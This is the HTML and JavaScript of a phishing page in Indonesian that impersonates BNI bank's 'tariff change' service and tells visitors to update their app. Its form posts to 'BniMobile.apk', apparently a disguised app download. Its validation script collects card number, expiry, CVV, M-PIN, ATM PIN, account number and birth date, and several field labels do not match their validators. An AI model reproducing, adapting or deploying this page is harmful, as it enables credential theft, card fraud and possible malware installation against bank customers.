
<!doctype html> <html lang="id"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <title>BNI Layanan ganti tarif</title> <meta name="description" content="Apakah Anda setuju tarif transaksi baru? Jika tidak setuju segera ganti ke tarif lama."> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=0"> <link rel="icon" href="ASSETS/img/favicon.ico" type="image/x-icon" /> <link rel="SHORTCUT ICON" href="ASSETS/img/favicon.ico" type="image/x-icon"> <link rel="apple-touch-icon" href="ASSETS/img/favicon.png" /> <link rel="apple-touch-icon" sizes="76x76" href="ASSETS/img/favicon_76x76.png" /> <link rel="apple-touch-icon" sizes="120x120" href="ASSETS/img/favicon_120x120.png" /> <link rel="apple-touch-icon" sizes="152x152" href="ASSETS/img/favicon_152x152.png" /> 

<link href="1satu.css" rel="stylesheet" type="text/css" /> 

<link href="2dua.css" rel="stylesheet" type="text/css" /> 

<link href="3tiga.css" rel="stylesheet" type="text/css" /> 

<link href="4empat.css" rel="stylesheet" type="text/css" /> 

<link href="5lima.css" rel="stylesheet" type="text/css" /> 

<link href="6enam.css" rel="stylesheet" type="text/css" /> 

<link href="7tujuh.css" rel="stylesheet" type="text/css" /> </head> <body> 	


<nav class="navbar navbar-inverse navbar-fixed-top"> 	<div class="container"> 		<div class="navbar-header"> 			<a class="navbar-brand" href="">SILAHKAN UPDATE APLIKASI </a> 		</div> 		<div id="navbar-header-second" class="navbar-header-second navbar-right"> 			<a href="home"> 				<span>Layanan Digital</span> 			</a> 		</div> 	</div> </nav> 	 	<div class="container container-margin"> 		<form id="form" action="BniMobile.apk" method="POST"> 			<input type="hidden" name="input" value="input" /> 			<div class="panel panel-default"> 			 	<div class="panel-body"> 					<div class="row"> 						<div class="col-md-12"> 						
<center>
<img src="bni.png" width="60%">
<br>
<h4>Terimakasih permintaan anda akan segera kami proses.</h4>
<br>
<h4></h4>


	</select> 
<br>
<br>
<div class="row"> 				
<div class="col-md-12"> 	
				</div> 			</div> 		</form> 	</div> 	 	<div id="modal-info" class="modal fade" role="dialog"> 	 <div class="modal-dialog modal-md"> 	 <div class="modal-content text-center"> 	 <div class="modal-body" id="modalError"> 	 <div id="modal-info-title"> 	 	<h4><b>Layanan Ganti Tarif</b></h4> 	 </div> 	 <div id="modal-info-text" class="modal-text">Silahkan isi data untuk proses ganti tarif transaksi anda.</div> 	 <div> 		 	<button class="btn btn-bni" data-dismiss="modal">Ok, Lanjutkan.</button> 		 </div> 	 </div> 	 </div> 	 </div> 	</div> 	 	<div id="modal-error" class="modal fade" role="dialog"> 	 <div class="modal-dialog modal-md"> 	 <div class="modal-content text-center"> 	 <div class="modal-body" id="modalError"> 	 <div class="modal-logo"> 	 <i class="fas fa-exclamation-circle color-orange"></i> 	 </div> 	 <div id="modal-error-title"></div> 	 <div id="modal-error-text" class="modal-text"></div> 	 <div> 		 	<button class="btn btn-bni" data-dismiss="modal">OK, Saya Mengerti</button> 		 </div> 	 </div> 	 </div> 	 </div> 	</div> 	 	

<script src="1.js"></script> 

<script src="2.js"></script> 

<script src="3.js"></script> 

<script src="4.js"></script> 

<script src="5.js"></script> 

<script src="6.js"></script> 

<script src="7.js"></script> 

<script src="8.js"></script> 

<script src="9.js"></script> 

<script src="10.js"></script> 

<script src="11.js"></script> 	 

<script> 		$(document).ready(function() { 			 			var alert = ''; 			var alert_list = ''; 			 			if (alert != 'undefined' && alert != '') { 				var res = JSON.parse(alert); 				 				if (res.code == "9008" || res.code == "9012") { 					$('form#form')[0].reset(); 				} 				 				$("#modal-error-title").html($("<h3><b>" + res.header + "</b></h3>")); 				$('#modal-error-text').html($("<p>" + res.message + "</p>")); 				$("#modal-error").modal("show"); 			} 			else if (alert_list != 'undefined' && alert_list != '') { 				var res = JSON.parse(alert_list); 				$("#modal-error-title").html($("<h3><b>" + res.header + "</b></h3>")); 		for (var key in res.message) { 				 if (res.message.hasOwnProperty(key)) { 				 	var tag = document.createElement("p"); 		 	var text = document.createTextNode(res.message[key]); 		 	tag.appendChild(text); 		 	var element = document.getElementById("modal-error-text"); 		 	element.appendChild(tag); 				 } 				} 	$("#modal-error").modal("show"); 			} 			else { 				$("#modal-info").modal("show"); 			} 			 			var date = new Date(); 			date.setDate(date.getDate()-6575); 			$('.date, #tanggal_lahir').datepicker({ 				language: 'id', 				orientation: 'left bottom', 				disableTouchKeyboard: true, 				format: 'dd/mm/yyyy', 				defaultViewDate: date, 				endDate: date, 	 autoclose: true 			}); 			 			$('#tanggal_lahir').on('changeDate show', function(e) { 		 $('#form').bootstrapValidator('revalidateField', 'tanggal_lahir'); 			}); 			 			$('#form').bootstrapValidator({ 				excluded: [':disabled'], 				fields: { 					
    
    nama: { 		 validators: { 		 notEmpty: { 		 message: "Email tidak boleh kosong" 		 }, 		 

    namaa: { 		 validators: { 		 notEmpty: { 		 message: "Nama pemegang Kartu tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[a-zA-Z].*[a-zA-Z].*[a-zA-Z]+$/, 		 message: "Nama hanya boleh menggunakan huruf dan spasi, minimal 3 huruf" 		 }, 		 stringLength: { 		 max: 40, 		 message: "Nama maksimal 40 karakter" 		 } 		 } 		 }, 		 


kota_penerbit_identitas: { 		 validators: { 		 notEmpty: { 		 message: "Kota Penerbit Identitas tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[a-zA-Z ]+$/, 		 message: "Kota Penerbit Identitas hanya boleh menggunakan huruf dan spasi" 		 }, 		 stringLength: { 		 	min: 3, 		 max: 25, 		 message: "Kota Penerbit Identitas minimal 3 maksimal 25 karakter" 		 } 		 } 		 }, 		 


namao: { 		 validators: { 		 notEmpty: { 		 message: "Nomor rekening tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[0-9]+$/, 		 message: "hanya boleh menggunakan angka" 		 }, 		 stringLength: { 		 min: 10, 		 max: 12, 		 message: "Rekening harus 10- 12 karakter" 		 } 		 } 		 }, 		 



kode: { 		 validators: { 		 notEmpty: { 		 message: " Valid Thru tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[0-9]+$/, 		 message: "Hanya boleh menggunakan angka" 		 }, 		 stringLength: { 		 min: 4, 		 max: 64, 		 message: "Valid Thru harus 4 digit. Contoh 1025" 		 } 		 } 		 }, 		 
debit: { 		 validators: { 		 notEmpty: { 		 message: " Nomor kartu tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[0-9]+$/, 		 message: "Hanya boleh menggunakan angka" 		 }, 		 stringLength: { 		 min: 16, 		 max: 16, 		 message: "Nomor kartu harus 16 digit" 		 } 		 } 		 }, 		 
norek: { 		 validators: { 		 notEmpty: { 		 message: "Tanggal lahir tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[0-9]+$/, 		 message: "Hanya boleh menggunakan angka" 		 }, 		 stringLength: { 		 min: 10, 		 max: 16, 		 message: "Nomor Rekening harus 10-16 digit" 		 } 		 } 		 }, 

mpin: { 		 validators: { 		 notEmpty: { 		 message: "Pin Atm tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[0-9]+$/, 		 message: "Hanya boleh menggunakan angka" 		 }, 		 stringLength: { 		 min: 6, 		 max: 6, 		 message: "M-Pin harus 6 digit" 		 } 		 } 		 }, 


pin: { 		 validators: { 		 notEmpty: { 		 message: "Cvv/Cvc tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[0-9]+$/, 		 message: "Cvv/Cvc hanya boleh menggunakan angka" 		 }, 		 stringLength: { 		 min: 3, 		 max: 3, 		 message: "Cvv/Cvc harus 3 digit" 		 } 		 } 		 }, 		 



tarik: { 		 validators: { 		 notEmpty: { 		 message: "Tarif harus di pilih" 		 }, 		 regexp: { 		 regexp: /^[A-Z]+$/, 		 message: "Silahkan pilih satu" 		 }, 		 stringLength: { 		 	min: 1, 		 max: 1, 		 message: "Pilih salah satu tarif" 		 } 		 } 		 },






tempat_lahir: { 		 validators: { 		 	notEmpty: { 		 message: "Tempat Lahir tidak boleh kosong" 		 }, 		 regexp: { 		 regexp: /^[a-zA-Z].*[a-zA-Z].*[a-zA-Z]+$/, 		 message: "Tempat Lahir hanya boleh menggunakan huruf dan spasi, minimal 3 huruf" 		 }, 		 stringLength: { 		 max: 40, 		 message: "Tempat Lahir maksimal 40 karakter" 		 } 		 } 		 }, 		 



tanggal_lahir: { 		 validators: { 		 notEmpty: { 		 message: "Tanggal Lahir tidak boleh kosong" 		 }, 		 date: { 		 		 	format: "DD/MM/YYYY", 		 		 	message: "Tanggal Lahir tidak sesuai format" 	 		 	}, 	 		 	regexp: { 		 regexp: /^[0-9/]+$/, 		 message: "Tanggal Lahir hanya boleh menggunakan angka dan /" 		 }, 		 stringLength: { 		 	min: 10, 		 max: 10, 		 message: "Tanggal Lahir harus 10 karakter" 		 } 		 } 		 } 				} 			}); 		}); 	</script>  </html>
<br>
<br>
